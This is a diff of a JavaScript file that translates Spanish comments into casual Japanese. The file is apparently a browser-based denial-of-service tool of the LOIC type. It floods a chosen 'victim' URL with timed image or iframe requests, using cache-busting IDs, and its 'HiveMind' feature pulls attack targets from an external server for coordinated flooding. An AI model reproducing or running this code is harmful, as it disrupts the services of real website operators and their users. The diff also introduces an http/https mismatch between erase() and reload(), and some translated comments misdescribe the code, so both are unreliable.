@@ -1,12 +1,13 @@
-//Variables globales.
-//NOTA: mala costumbre que hay que corregir...
+//グローバル変数
+//※あんまり良くない癖があるから修正をかけるかも(気が向いたら)
+//↑たぶんしない
 var fireInterval;
 var shootID;
 var typeValue = 'img';
 var state = 'stop';
 var shootRequest = {};
 
-//Modifica la URL para que tenga "http://" al principio.
+//URLの先頭に "http://"が付くように修正するためのやつ（確か
 /*
 function httpValue(){
 	if ($('#target').val().substr(0,7) != "http://") {
@@ -19,7 +20,7 @@ function httpValue(){
 }
 */
 
-//Modifica la URL para añadir los arrays.
+//URLを修正して追加するところ
 function arrayValue(url,type){
 	if (type == 'target'){
 		if (/\?/.test(url)){
@@ -39,7 +40,7 @@ function arrayValue(url,type){
 	}
 }
 
-//Modifica la cadencia cuando cambia el valor del slide.
+//スライド値変更時のケーデンスを変更するやつ
 function move_slide(){
 	if (state == 'stop'){
 		return;
@@ -47,7 +48,7 @@ function move_slide(){
 	preshoot($('#sl0').mbgetVal());
 }
 
-//Controla el botón de ataque.
+//攻撃開始ボタン操作
 function start_stop(){
 	if (state == 'stop'){
 		state = 'start';
@@ -61,7 +62,7 @@ function start_stop(){
 	}
 }
 
-//Cambia el estilo del botón dependiendo de la opción deseada.
+//ボタンの見た目の設定
 function shootType(type){
 	$('#counter_requested').html('0');
 	$('#counter_tail').html('0');
@@ -78,26 +79,26 @@ function shootType(type){
 	move_slide();
 }
 
-//Variables de ataque.
-//El array aleatorio ID que se carga con la URL es para evitar que Javascript
-//use la caché del navegador y vuelva a descargar el archivo.
+//攻撃の変数
+//URLと一緒に読み込まれるランダムな配列IDは、ブロックを回避するためのやつ
+//ブラウザのキャッシュを使って、ファイルを再ダウンロードする
 //---------------------------
-//Petición mediante imagen.
+//画像のリクエストをする(img攻撃)
 var shoot1 = function () {
 	var targetURL = $('#target').val();
 	var msg = $('#msg').val();
 	var shootID = Number(new Date());
 	var resource = document.createElement('img');
 	resource.setAttribute('src',targetURL+arrayValue(targetURL,'target')+msg+'&ID='+Number(new Date()));
-	resource.setAttribute('onload','score_requested('+shootID+')'); //A no ser que el objetivo sea una imágen siempre
-	resource.setAttribute('onabort','score_requested('+shootID+')'); //va a dar error, pero mientras obtenga una
-	resource.setAttribute('onerror','score_requested('+shootID+')'); //una respuesta del servidor me vale.
+	resource.setAttribute('onload','score_requested('+shootID+')'); //なんか
+	resource.setAttribute('onabort','score_requested('+shootID+')'); //エラーを出すけど
+	resource.setAttribute('onerror','score_requested('+shootID+')'); //サーバーから応答があればいいと思う（てきとー
 	resource.setAttribute('id',shootID);
 	$('#imgContainer').append(resource);
 	score_tail();
 }
 
-//Petición mediante IFrame.
+//Iframe攻撃のやつ
 var shoot2 = function () {
 	var targetURL = $('#target').val();
 	var msg = $('#msg').val();
@@ -111,7 +112,7 @@ var shoot2 = function () {
 }
 //---------------------------
 
-//Invoca un intervalo de la variable de ataque deseada.
+//攻撃変数の範囲を呼び出す
 function preshoot(interval){
 	if (typeValue == 'img'){
 		clearInterval(fireInterval);
@@ -123,18 +124,18 @@ function preshoot(interval){
 	}
 }
 
-//Ciclos del intervalo efectuados.
+//実行された時の間隔
 function score_tail(){
 	$('#counter_tail')[0].innerHTML++
 }
 
-//Cargas completas de la web víctima efectuadas.
+//攻撃対象サイトの完全アップロードをする
 function score_requested(shootID){
 	$('#counter_requested')[0].innerHTML++
 	$('#'+shootID).remove();
 }
 
-//Controla el botón del HiveMind.
+//HiveMindボタンの操作
 function hive(){
 	if ($('#hivebutton').val() == 'Connect'){
 		$('#hivebutton').val('Disconnect');
@@ -145,9 +146,9 @@ function hive(){
 	}
 }
 
-//Carga el HiveMind desde un servidor externo.
-//El array aleatorio ID que se carga con la URL es para evitar que Javascript
-//use la caché del navegador y vuelva a descargar el archivo.
+//外部サーバーからHiveMindをロードします。
+//URLと一緒に読み込まれるランダムなIDは、このIDを読み込むことができないようにするため
+//ブラウザのキャッシュを利用し、ファイルを再ダウンロードする
 function load_hive(){
 	if ($('#hivebutton').val() == 'Disconnect'){
 		var hiveURL = $('#hiveURL').val();
@@ -164,7 +165,7 @@ function load_hive(){
 	}
 }
 
-//Cambia los valores obtenidos en change_hive().
+//change_hive()で取得した値を変更する
 function change_hive(hiveID){
 	$('#target').val(info.target);
 	$('#msg').val(info.msg);
@@ -179,14 +180,14 @@ function change_hive(hiveID){
 	$('#'+hiveID).remove();
 }
 
-//Elimina el valor "http://" al obtener el foco.
+//フォーカス取得時の"http://"を削除する
 function erase(id){
-	if ($(id).val() == 'http://'){
+	if ($(id).val() == 'https://'){
 		$(id).val('');
 	}
 }
 
-//Restaura el valor "http://" al perder el foco.
+//フォーカスが外れた場合、"http://"をつけなおす
 function reload(id){
 	if ($(id).val() == ''){
 		$(id).val('http://');
